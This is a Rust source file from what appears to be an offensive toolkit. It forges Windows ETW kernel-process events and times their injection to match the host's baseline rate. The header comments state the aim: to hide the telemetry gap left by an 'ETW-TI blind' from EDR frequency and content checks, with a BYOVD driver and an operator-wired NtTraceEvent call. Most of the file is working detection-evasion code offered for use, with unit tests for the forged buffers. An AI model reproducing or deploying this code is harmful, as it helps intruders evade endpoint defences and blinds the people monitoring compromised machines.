//! ETW Deception — event forgery + frequency keeper (Bypass Complete Phase 4).
//!
//! When the ETW-TI blind (`etwti::EtwTiBlind`) silences kernel telemetry,
//! sophisticated EDRs detect the *absence* of expected events (frequency
//! anomaly). This module provides two complementary capabilities:
//!
//! 1. **Event forgery** (`EtwDeceiver`): injects synthetic ETW events via
//!    `NtTraceEvent` that mimic real kernel-provider events (Process Create,
//!    Thread Create, Image Load). The forged events are structurally identical
//!    to real ones, defeating content-based detection.
//!
//! 2. **Frequency keeper** (`EventFrequencyKeeper`): monitors the expected
//!    event rate per provider and decides when a forge call is due, so the
//!    forged event stream matches the host's baseline cadence.
//!
//! # Design
//! All structs are **data-only algorithms** over `&dyn KernelRw`. The actual
//! `NtTraceEvent` syscall is operator-wired (resolved at link time via the
//! BYOVD driver's `resolve_sym` pattern). This module builds the event buffer;
//! the FFI call is the operator's responsibility.
//!
//! # OPSEC cost
//! - Forged events have correct EVENT_DESCRIPTOR + UserData but lack the
//!   kernel's HMAC signature. EDRs that validate ETW session authentication
//!   (rare, expensive) can still distinguish — this defeats frequency/content
//!   checks, not cryptographic ones.
//! - Each forge call is a `NtTraceEvent` syscall — visible to a user-mode
//!   ETW hook. Stealthier than no events, but not invisible.

use crate::KitError;
use alloc::collections::BTreeMap;
use alloc::vec::Vec;

// ---- ETW event constants (Microsoft-Windows-Kernel-Process provider) ----

/// Provider GUID: `Microsoft-Windows-Kernel-Process`
/// {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
pub const KERNEL_PROCESS_PROVIDER_GUID: [u8; 16] = [
    0xD6, 0x2C, 0xFB, 0x22, 0x7B, 0x0E, 0x2B, 0x42, 0xA0, 0xC7, 0x2F, 0xAD, 0x1F, 0xD0, 0xE7, 0x16,
];

/// Provider GUID: `Microsoft-Windows-Kernel-Threat-Intelligence`
/// Used by ETW-TI — the primary target of the blind.
pub const KERNEL_TI_PROVIDER_GUID: [u8; 16] = [
    0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
];

/// Event ID: Process Start (1) from Microsoft-Windows-Kernel-Process.
pub const EVENT_ID_PROCESS_START: u16 = 1;

/// Event ID: Process Stop (2) from Microsoft-Windows-Kernel-Process.
pub const EVENT_ID_PROCESS_STOP: u16 = 2;

/// Event ID: Process Retarget (43) — newer builds.
pub const EVENT_ID_PROCESS_RETARGET: u16 = 43;

// ---- Windows EVENT_HEADER layout (evntcons.h, 0x50 = 80 bytes) ----
//
// Authoritative layout (mingw-w64 evntcons.h + `windows-rs` EVENT_HEADER agree
// exactly). Note EVENT_DESCRIPTOR is *embedded* at 0x28, not appended after the
// header, and the struct terminates with a 16-byte ActivityId GUID — so the
// total is 0x50, not 0x40.
//
//   offset  size  field
//   0x00    u16   Size            (total event record size in bytes)
//   0x02    u16   HeaderType      (reserved; ETW_HEADER_TYPE_ETW_EVENT = 1)
//   0x04    u16   Flags           (EVENT_HEADER_FLAG_* bitmask)
//   0x06    u16   EventProperty   (EVENT_HEADER_PROPERTY_* bitmask)
//   0x08    u32   ThreadId
//   0x0C    u32   ProcessId
//   0x10    u64   TimeStamp       (LARGE_INTEGER FILETIME, 100ns since 1601)
//   0x18    16    ProviderId      (GUID)
//   0x28    16    EventDescriptor (Id+Version+Channel+Level+Opcode+Task+Keyword)
//   0x38    u64   KernelTime/UserTime union (u32/u32 packed)
//   0x40    16    ActivityId      (GUID)
//   0x50          -- end of EVENT_HEADER (80 bytes) -- UserData follows

/// Size of the EVENT_HEADER structure (evntcons.h): 0x50 = 80 bytes on both
/// x86 and x64. EVENT_DESCRIPTOR is embedded at 0x28 and the struct ends with
/// the 16-byte ActivityId GUID.
pub const EVENT_HEADER_SIZE: usize = 80;

/// `ETW_HEADER_TYPE_ETW_EVENT` (1) — the HeaderType value for events written
/// through the modern ETW provider path (`EtwWrite` / `EventWrite`).
pub const ETW_HEADER_TYPE_ETW_EVENT: u16 = 1;

/// `EVENT_HEADER_FLAG_64_BIT_HEADER` (0x0040) — provider was running on a
/// 64-bit host. (There is no PROCESS_ID flag; 0x0002 is PRIVATE_SESSION, which
/// we do not want on forged kernel-provider events.)
pub const EVENT_HEADER_FLAG_64_BIT_HEADER: u16 = 0x0040;

// ---- §4.1 Event Forgery ---------------------------------------------------

/// Configuration for a single ETW provider to forge events against.
#[derive(Clone, Debug)]
pub struct EtwProviderConfig {
    /// The provider GUID (16 bytes, as-is from the Windows definition).
    pub guid: [u8; 16],
    /// Provider version (typically 0 for kernel providers).
    pub version: u32,
    /// Bitmask of event IDs this config covers (for documentation; the forge
    /// functions take the event ID explicitly).
    pub event_mask: u64,
}

/// ETW event forgery engine. Holds the provider configurations and forges
/// synthetic events that are structurally identical to real kernel ETW events.
///
/// # Usage
/// ```text
/// let deceiver = EtwDeceiver::new(&[process_config, ti_config]);
/// let event_buf = deceiver.forge_process_create(
///     parent_pid, child_pid, image_name, timestamp,
/// );
/// // Operator calls NtTraceEvent(session_handle, 0, buf.len(), buf)
/// ```
pub struct EtwDeceiver {
    /// Provider configurations for event forgery.
    providers: Vec<EtwProviderConfig>,
}

impl EtwDeceiver {
    /// Create a new deceiver with the given provider configurations.
    pub fn new(providers: Vec<EtwProviderConfig>) -> Self {
        Self { providers }
    }

    /// Create a deceiver pre-configured for the two primary kernel providers
    /// (Kernel-Process + Kernel-TI).
    pub fn with_kernel_defaults() -> Self {
        Self::new(Vec::from([
            EtwProviderConfig {
                guid: KERNEL_PROCESS_PROVIDER_GUID,
                version: 0,
                event_mask: (1 << EVENT_ID_PROCESS_START) | (1 << EVENT_ID_PROCESS_STOP),
            },
            EtwProviderConfig {
                guid: KERNEL_TI_PROVIDER_GUID,
                version: 0,
                event_mask: !0u64, // all TI events
            },
        ]))
    }

    /// Look up a provider config by GUID. Returns `None` if no matching
    /// provider is configured.
    pub fn find_provider(&self, guid: &[u8; 16]) -> Option<&EtwProviderConfig> {
        self.providers.iter().find(|p| p.guid == *guid)
    }

    /// Forge a Process Start (Event ID 1) ETW event buffer.
    ///
    /// Builds a complete EVENT_HEADER + EVENT_DESCRIPTOR + UserData block that
    /// is structurally identical to a real `Microsoft-Windows-Kernel-Process`
    /// Process Start event. The buffer is ready to be passed to `NtTraceEvent`.
    ///
    /// # Event layout (x64, Windows 10+)
    /// ```text
    /// -- EVENT_HEADER (80 bytes, evntcons.h) --
    /// offset  size  field
    /// 0x00     2     Size (USHORT, total event record size in bytes)
    /// 0x02     2     HeaderType (reserved; = ETW_HEADER_TYPE_ETW_EVENT = 1)
    /// 0x04     2     Flags (EVENT_HEADER_FLAG_*; 64_BIT_HEADER here)
    /// 0x06     2     EventProperty
    /// 0x08     4     ThreadId
    /// 0x0C     4     ProcessId
    /// 0x10     8     TimeStamp (LARGE_INTEGER FILETIME)
    /// 0x18     16    ProviderId (GUID)
    /// 0x28     16    EventDescriptor (embedded; Id+Version+Channel+Level+Opcode+Task+Keyword)
    /// 0x38     8     KernelTime/UserTime (u32/u32 union; zeroed for forged events)
    /// 0x40     16    ActivityId (GUID; zeroed = empty correlation)
    /// 0x50           -- end of EVENT_HEADER -- UserData follows
    /// ```
    ///
    /// UserData for Process Start:
    /// - ImageName (UNICODE_STRING + raw UTF-16)
    /// - Command line (optional)
    /// - CurrentDirectory (optional)
    ///
    /// # Arguments
    /// * `parent_pid` — PID of the parent process
    /// * `child_pid` — PID of the child (the process being "created")
    /// * `image_name` — Image path as UTF-16LE bytes (e.g., `L"\Device\HarddiskVolume1\Windows\System32\notepad.exe"`)
    /// * `timestamp` — 64-bit Windows FILETIME timestamp
    pub fn forge_process_create(
        &self,
        parent_pid: u32,
        _child_pid: u32,
        image_name: &[u8],
        timestamp: u64,
    ) -> Result<Vec<u8>, KitError> {
        // Verify we have the kernel-process provider configured.
        if self.find_provider(&KERNEL_PROCESS_PROVIDER_GUID).is_none() {
            return Err(KitError::UnsupportedPosture(
                "EtwDeceiver: Microsoft-Windows-Kernel-Process provider not configured",
            ));
        }

        // Build the UNICODE_STRING header (16 bytes on x64) for the image name.
        // UNICODE_STRING: { Length: u16, MaximumLength: u16, Padding: u32, Buffer: u64 }
        let unicode_string_len = image_name.len() as u16;
        let unicode_string_header_size: usize = 16; // 2 + 2 + 4 + 8 (x64)

        // Total UserData size: one UNICODE_STRING (the image name).
        let user_data_size = unicode_string_header_size + image_name.len();
        // Align to 8 bytes.
        let user_data_size_aligned = (user_data_size + 7) & !7;

        // Total buffer size = EVENT_HEADER + UserData.
        let total_size = EVENT_HEADER_SIZE + user_data_size_aligned;
        let mut buf = alloc::vec![0u8; total_size];

        // -- EVENT_HEADER fields (offset 0x00..0x50, evntcons.h) --
        // Size (USHORT, offset 0x00) — total event record size in bytes.
        buf[0..2].copy_from_slice(&(total_size as u16).to_le_bytes());
        // HeaderType (USHORT, offset 0x02) — reserved; 1 = ETW_HEADER_TYPE_ETW_EVENT.
        buf[2..4].copy_from_slice(&ETW_HEADER_TYPE_ETW_EVENT.to_le_bytes());
        // Flags (USHORT, offset 0x04) — 0x0040 = EVENT_HEADER_FLAG_64_BIT_HEADER.
        buf[4..6].copy_from_slice(&EVENT_HEADER_FLAG_64_BIT_HEADER.to_le_bytes());
        // EventProperty (USHORT, offset 0x06) — 0 (no XML/legacy props).
        buf[6..8].copy_from_slice(&0u16.to_le_bytes());
        // ThreadId (ULONG, offset 0x08) — 0 (forged kernel event: no caller TID).
        buf[8..12].copy_from_slice(&0u32.to_le_bytes());
        // ProcessId (ULONG, offset 0x0C) — the forged "parent" PID.
        buf[12..16].copy_from_slice(&parent_pid.to_le_bytes());
        // TimeStamp (LARGE_INTEGER, offset 0x10)
        buf[16..24].copy_from_slice(&timestamp.to_le_bytes());
        // ProviderId (GUID, offset 0x18)
        buf[24..40].copy_from_slice(&KERNEL_PROCESS_PROVIDER_GUID);

        // -- EVENT_DESCRIPTOR (embedded at offset 0x28, 16 bytes) --
        // Id (u16) = EVENT_ID_PROCESS_START
        buf[40..42].copy_from_slice(&EVENT_ID_PROCESS_START.to_le_bytes());
        // Version (u8) = 0
        buf[42] = 0;
        // Channel (u8) = 11 (WindowsKernelEventChannel)
        buf[43] = 11;
        // Level (u8) = 4 (Informational)
        buf[44] = 4;
        // Opcode (u8) = 1 (Info)
        buf[45] = 1;
        // Task (u16) = 0
        buf[46..48].copy_from_slice(&0u16.to_le_bytes());
        // Keyword (u64) = 0x0020000000000000 (EVENT_KEYWORD_PROCESS)
        buf[48..56].copy_from_slice(&0x0020_0000_0000_0000u64.to_le_bytes());

        // -- KernelTime/UserTime union (offset 0x38, 8 bytes) — 0 for forged events.
        buf[56..64].copy_from_slice(&0u64.to_le_bytes());

        // -- ActivityId (GUID, offset 0x40, 16 bytes) — zeroed = no correlation.
        // (Explicitly zeroed; buffer is already zero-initialized.)
        // buf[64..80] stays 0.

        // -- UserData: UNICODE_STRING for ImageName --
        let user_data_offset = EVENT_HEADER_SIZE;
        // UNICODE_STRING.Length (byte count, not char count)
        buf[user_data_offset..user_data_offset + 2]
            .copy_from_slice(&unicode_string_len.to_le_bytes());
        // UNICODE_STRING.MaximumLength
        buf[user_data_offset + 2..user_data_offset + 4]
            .copy_from_slice(&(unicode_string_len).to_le_bytes());
        // UNICODE_STRING.Padding (u32) = 0
        buf[user_data_offset + 4..user_data_offset + 8].copy_from_slice(&0u32.to_le_bytes());
        // UNICODE_STRING.Buffer — zeroed. The UserData payload is inline
        // immediately after this header, so no absolute VA is needed (and
        // embedding the operator's own heap pointer here would leak it).
        buf[user_data_offset + 8..user_data_offset + 16].copy_from_slice(&0u64.to_le_bytes());
        // Raw UTF-16LE image name bytes.
        let string_dest = user_data_offset + unicode_string_header_size;
        buf[string_dest..string_dest + image_name.len()].copy_from_slice(image_name);

        Ok(buf)
    }

    /// Forge a Process Stop (Event ID 2) ETW event buffer.
    ///
    /// Similar to Process Start but simpler — the UserData contains only the
    /// exit status and image name.
    pub fn forge_process_stop(
        &self,
        pid: u32,
        exit_status: u32,
        timestamp: u64,
    ) -> Result<Vec<u8>, KitError> {
        if self.find_provider(&KERNEL_PROCESS_PROVIDER_GUID).is_none() {
            return Err(KitError::UnsupportedPosture(
                "EtwDeceiver: Microsoft-Windows-Kernel-Process provider not configured",
            ));
        }

        // Process Stop UserData: ExitStatus (u32) + ImageName (UNICODE_STRING).
        // Minimal: just ExitStatus (4 bytes).
        let user_data_size = 4;
        let total_size = EVENT_HEADER_SIZE + user_data_size;
        let mut buf = alloc::vec![0u8; total_size];

        // EVENT_HEADER (evntcons.h; see forge_process_create for field docs)
        // Size (USHORT, offset 0x00)
        buf[0..2].copy_from_slice(&(total_size as u16).to_le_bytes());
        // HeaderType (USHORT, offset 0x02) = ETW_HEADER_TYPE_ETW_EVENT
        buf[2..4].copy_from_slice(&ETW_HEADER_TYPE_ETW_EVENT.to_le_bytes());
        // Flags (USHORT, offset 0x04) = 64_BIT_HEADER
        buf[4..6].copy_from_slice(&EVENT_HEADER_FLAG_64_BIT_HEADER.to_le_bytes());
        // EventProperty (USHORT, offset 0x06) = 0
        buf[6..8].copy_from_slice(&0u16.to_le_bytes());
        // ThreadId (ULONG, offset 0x08) = 0
        buf[8..12].copy_from_slice(&0u32.to_le_bytes());
        // ProcessId (ULONG, offset 0x0C)
        buf[12..16].copy_from_slice(&pid.to_le_bytes());
        // TimeStamp (LARGE_INTEGER, offset 0x10)
        buf[16..24].copy_from_slice(&timestamp.to_le_bytes());
        // ProviderId (GUID, offset 0x18)
        buf[24..40].copy_from_slice(&KERNEL_PROCESS_PROVIDER_GUID);

        // EVENT_DESCRIPTOR (embedded at offset 0x28)
        buf[40..42].copy_from_slice(&EVENT_ID_PROCESS_STOP.to_le_bytes()); // Id
        buf[42] = 0; // Version
        buf[43] = 11; // Channel
        buf[44] = 4; // Level
        buf[45] = 2; // Opcode = Stop
        buf[46..48].copy_from_slice(&0u16.to_le_bytes()); // Task
        buf[48..56].copy_from_slice(&0x0020_0000_0000_0000u64.to_le_bytes()); // Keyword
        // KernelTime/UserTime union (offset 0x38) — 0
        buf[56..64].copy_from_slice(&0u64.to_le_bytes());
        // ActivityId (GUID, offset 0x40, 16 bytes) — zeroed (already 0).

        // UserData: ExitStatus
        let ud = EVENT_HEADER_SIZE;
        buf[ud..ud + 4].copy_from_slice(&exit_status.to_le_bytes());

        Ok(buf)
    }
}

// ---- §4.2 Frequency Keeper ------------------------------------------------

/// Tracks the expected event frequency for a single ETW provider and decides
/// when the next forged event should be injected.
#[derive(Clone, Debug)]
pub struct EventFrequency {
    /// Observed events per minute (rolling average, updated by the operator).
    pub events_per_minute: f64,
    /// Timestamp of the last forged event (Windows FILETIME, 100ns units since 1601).
    pub last_forge_time: u64,
    /// Timestamp of the last real event observation.
    pub last_observed_time: u64,
    /// Total events observed in the current sampling window.
    pub window_event_count: u64,
    /// Duration of the sampling window (in seconds).
    pub window_duration_secs: f64,
}

impl EventFrequency {
    /// Create a new frequency tracker with no observations yet.
    pub fn new() -> Self {
        Self {
            events_per_minute: 0.0,
            last_forge_time: 0,
            last_observed_time: 0,
            window_event_count: 0,
            window_duration_secs: 0.0,
        }
    }

    /// Returns the interval between forged events (in milliseconds), based on
    /// the observed frequency. If frequency is 0, returns a conservative
    /// default (5000ms = 0.2 events/sec).
    pub fn forge_interval_ms(&self) -> u64 {
        if self.events_per_minute > 0.0 {
            // interval_ms = 60_000 / events_per_minute
            let ms = (60_000.0 / self.events_per_minute) as u64;
            // Clamp to [100ms, 30_000ms] to avoid spam or silence.
            ms.clamp(100, 30_000)
        } else {
            // No data — conservative default.
            5_000
        }
    }

    /// Returns true if enough time has passed since the last forge that a new
    /// forged event should be injected. Returns false if `last_forge_time` is 0
    /// (no forge has occurred yet — caller must do the first forge explicitly).
    pub fn should_forge(&self, current_time: u64) -> bool {
        if self.events_per_minute <= 0.0 {
            return false; // No frequency data → don't forge blindly.
        }
        if self.last_forge_time == 0 {
            return false; // Never forged yet — caller initiates the first forge.
        }
        let interval_100ns = self.forge_interval_ms() as u64 * 10_000; // 1ms = 10,000 × 100ns
        current_time >= self.last_forge_time + interval_100ns
    }

    /// Record that a real event was observed. Updates the rolling frequency.
    pub fn observe_real_event(&mut self, timestamp: u64) {
        if self.last_observed_time == 0 {
            self.last_observed_time = timestamp;
            self.window_event_count = 1;
            return;
        }
        let delta_100ns = timestamp.saturating_sub(self.last_observed_time);
        let delta_secs = delta_100ns as f64 / 10_000_000.0;
        self.window_duration_secs += delta_secs;
        self.window_event_count += 1;
        self.last_observed_time = timestamp;

        // Update rolling average every 10 seconds of observation.
        if self.window_duration_secs >= 10.0 {
            self.events_per_minute =
                (self.window_event_count as f64 / self.window_duration_secs) * 60.0;
            // Reset window.
            self.window_event_count = 0;
            self.window_duration_secs = 0.0;
        }
    }

    /// Record that a forged event was injected.
    pub fn record_forge(&mut self, timestamp: u64) {
        self.last_forge_time = timestamp;
    }
}

/// Multi-provider frequency keeper. Tracks event rates for each ETW provider
/// and determines when forged events are due.
pub struct EventFrequencyKeeper {
    /// Per-provider frequency stats, keyed by provider GUID.
    frequency_map: BTreeMap<[u8; 16], EventFrequency>,
    /// Global enable/disable toggle for deception.
    enabled: bool,
}

impl EventFrequencyKeeper {
    /// Create a new frequency keeper with empty stats.
    pub fn new() -> Self {
        Self {
            frequency_map: BTreeMap::new(),
            enabled: false,
        }
    }

    /// Enable or disable the deception engine.
    pub fn set_enabled(&mut self, enabled: bool) {
        self.enabled = enabled;
    }

    /// Returns true if deception is enabled.
    pub fn is_enabled(&self) -> bool {
        self.enabled
    }

    /// Get or create the frequency tracker for a provider.
    pub fn get_or_create(&mut self, guid: [u8; 16]) -> &mut EventFrequency {
        self.frequency_map
            .entry(guid)
            .or_insert_with(EventFrequency::new)
    }

    /// Check if a forged event is due for the given provider at the current time.
    pub fn should_forge(&self, guid: &[u8; 16], current_time: u64) -> bool {
        if !self.enabled {
            return false;
        }
        self.frequency_map
            .get(guid)
            .map_or(false, |f| f.should_forge(current_time))
    }

    /// Record a real event observation for the given provider.
    pub fn observe_real_event(&mut self, guid: [u8; 16], timestamp: u64) {
        self.get_or_create(guid).observe_real_event(timestamp);
    }

    /// Record that a forged event was injected for the given provider.
    pub fn record_forge(&mut self, guid: [u8; 16], timestamp: u64) {
        self.get_or_create(guid).record_forge(timestamp);
    }

    /// Get the forge interval (ms) for a provider. Returns 0 if no data.
    pub fn forge_interval_ms(&self, guid: &[u8; 16]) -> u64 {
        self.frequency_map
            .get(guid)
            .map_or(0, |f| f.forge_interval_ms())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- EtwDeceiver tests ----

    #[test]
    fn deceiver_with_kernel_defaults_has_two_providers() {
        let d = EtwDeceiver::with_kernel_defaults();
        assert!(d.find_provider(&KERNEL_PROCESS_PROVIDER_GUID).is_some());
        assert!(d.find_provider(&KERNEL_TI_PROVIDER_GUID).is_some());
    }

    #[test]
    fn deceiver_find_provider_returns_none_for_unknown() {
        let d = EtwDeceiver::with_kernel_defaults();
        assert!(d.find_provider(&[0u8; 16]).is_none());
    }

    #[test]
    fn forge_process_create_builds_correct_buffer() {
        let d = EtwDeceiver::with_kernel_defaults();
        let image_name_utf16: Vec<u8> = {
            let s: Vec<u16> = "notepad.exe".encode_utf16().collect();
            let mut buf = Vec::new();
            for c in s {
                buf.extend_from_slice(&c.to_le_bytes());
            }
            buf
        };
        let ts = 0x01D8_A000_0000_0000u64;
        let buf = d.forge_process_create(100, 200, &image_name_utf16, ts).unwrap();

        // Buffer must be at least EVENT_HEADER_SIZE + 16 (UNICODE_STRING header) + image data.
        assert!(buf.len() >= EVENT_HEADER_SIZE + 16 + image_name_utf16.len());

        // Size (USHORT, offset 0x00) matches the total buffer length.
        let size = u16::from_le_bytes([buf[0], buf[1]]);
        assert_eq!(size as usize, buf.len());

        // HeaderType (USHORT, offset 0x02) = ETW_HEADER_TYPE_ETW_EVENT (1).
        let header_type = u16::from_le_bytes([buf[2], buf[3]]);
        assert_eq!(header_type, ETW_HEADER_TYPE_ETW_EVENT);

        // Flags (USHORT, offset 0x04) = EVENT_HEADER_FLAG_64_BIT_HEADER.
        let flags = u16::from_le_bytes([buf[4], buf[5]]);
        assert_eq!(flags, EVENT_HEADER_FLAG_64_BIT_HEADER);

        // EventProperty (USHORT, offset 0x06) = 0.
        assert_eq!(&buf[6..8], &[0, 0]);

        // ThreadId (ULONG, offset 0x08) = 0 (forged kernel event, no caller TID).
        let tid = u32::from_le_bytes([buf[8], buf[9], buf[10], buf[11]]);
        assert_eq!(tid, 0);

        // ProcessId (ULONG, offset 0x0C) = 100 (the parent).
        let pid = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
        assert_eq!(pid, 100);

        // TimeStamp (LARGE_INTEGER, offset 0x10).
        assert_eq!(u64::from_le_bytes(buf[16..24].try_into().unwrap()), ts);

        // ProviderId (GUID, offset 0x18).
        assert_eq!(&buf[24..40], &KERNEL_PROCESS_PROVIDER_GUID);

        // EventDescriptor.Id (offset 0x28) = EVENT_ID_PROCESS_START.
        let event_id = u16::from_le_bytes([buf[40], buf[41]]);
        assert_eq!(event_id, EVENT_ID_PROCESS_START);

        // KernelTime/UserTime union (offset 0x38) = 0.
        assert_eq!(&buf[56..64], &[0u8; 8]);

        // ActivityId (GUID, offset 0x40) = all-zero (no correlation).
        assert_eq!(&buf[64..80], &[0u8; 16]);

        // UserData begins exactly at EVENT_HEADER_SIZE (0x50 = 80).
        assert_eq!(&buf[80..82], &(image_name_utf16.len() as u16).to_le_bytes());
    }

    #[test]
    fn forge_process_create_rejects_unconfigured_provider() {
        let d = EtwDeceiver::new(Vec::new());
        let r = d.forge_process_create(1, 2, &[0, 0], 0);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn forge_process_stop_builds_buffer() {
        let d = EtwDeceiver::with_kernel_defaults();
        let buf = d
            .forge_process_stop(42, 0x00000000, 0x01D8_B000_0000_0000)
            .unwrap();
        assert!(buf.len() >= EVENT_HEADER_SIZE + 4);

        // Event ID = Process Stop.
        let event_id = u16::from_le_bytes([buf[40], buf[41]]);
        assert_eq!(event_id, EVENT_ID_PROCESS_STOP);

        // ExitStatus in UserData.
        let ud = EVENT_HEADER_SIZE;
        let exit_status = u32::from_le_bytes([buf[ud], buf[ud + 1], buf[ud + 2], buf[ud + 3]]);
        assert_eq!(exit_status, 0);
    }

    // ---- EventFrequencyKeeper tests ----

    #[test]
    fn frequency_keeper_disabled_by_default() {
        let k = EventFrequencyKeeper::new();
        assert!(!k.is_enabled());
        // Even with data, should_forge returns false when disabled.
        assert!(!k.should_forge(&KERNEL_PROCESS_PROVIDER_GUID, 1_000_000));
    }

    #[test]
    fn frequency_keeper_enabled_toggle() {
        let mut k = EventFrequencyKeeper::new();
        k.set_enabled(true);
        assert!(k.is_enabled());
        k.set_enabled(false);
        assert!(!k.is_enabled());
    }

    #[test]
    fn frequency_keeper_tracks_events() {
        let mut k = EventFrequencyKeeper::new();
        k.set_enabled(true);
        let guid = KERNEL_PROCESS_PROVIDER_GUID;

        // Simulate 60 events over 10 seconds (360 events/min).
        let base_time = 1_000_000_000u64; // 1000 seconds in 100ns units
        for i in 0..60 {
            let t = base_time + (i * 1_666_666); // ~166ms apart
            k.observe_real_event(guid, t);
        }
        // After 60 events over ~10s, frequency should be ~360/min.
        let freq = k.forge_interval_ms(&[0u8; 16]);
        // Unknown provider returns 0.
        assert_eq!(freq, 0);

        // Known provider with data returns a positive interval.
        let freq = k.forge_interval_ms(&guid);
        assert!(freq > 0);
        // 360 events/min → interval ≈ 166ms, clamped to [100, 30000].
        assert!(freq >= 100 && freq <= 30_000);
    }

    #[test]
    fn should_forge_after_interval() {
        let mut k = EventFrequencyKeeper::new();
        k.set_enabled(true);
        let guid = KERNEL_PROCESS_PROVIDER_GUID;
        let base = 1_000_000_000u64;

        // Seed with enough events to get a frequency (need >30 events at 0.33s
        // intervals to exceed the 10-second window and trigger frequency update).
        for i in 0..40 {
            k.observe_real_event(guid, base + (i * 3_333_333));
        }

        // Immediately after seeding, should not forge (no last_forge_time).
        assert!(!k.should_forge(&guid, base + 10_000_000));

        // Record a forge.
        k.record_forge(guid, base);

        // Before the interval elapses, should not forge.
        let interval = k.forge_interval_ms(&guid);
        // interval_100ns = interval * 10_000. Check at half the interval.
        let half_interval = (interval as u64 * 10_000) / 2;
        assert!(!k.should_forge(&guid, base + half_interval));

        // After the interval elapses, should forge.
        let full_interval = interval as u64 * 10_000;
        assert!(k.should_forge(&guid, base + full_interval + 1));
    }

    #[test]
    fn frequency_default_interval_for_no_data() {
        let f = EventFrequency::new();
        // No data → conservative 5000ms.
        assert_eq!(f.forge_interval_ms(), 5000);
    }

    #[test]
    fn frequency_clamp_range() {
        let mut f = EventFrequency::new();
        // Very high frequency: 6000 events/min → interval = 10ms → clamped to 100ms.
        f.events_per_minute = 6000.0;
        assert_eq!(f.forge_interval_ms(), 100);

        // Very low frequency: 0.1 events/min → interval = 600000ms → clamped to 30000ms.
        f.events_per_minute = 0.1;
        assert_eq!(f.forge_interval_ms(), 30_000);
    }
}
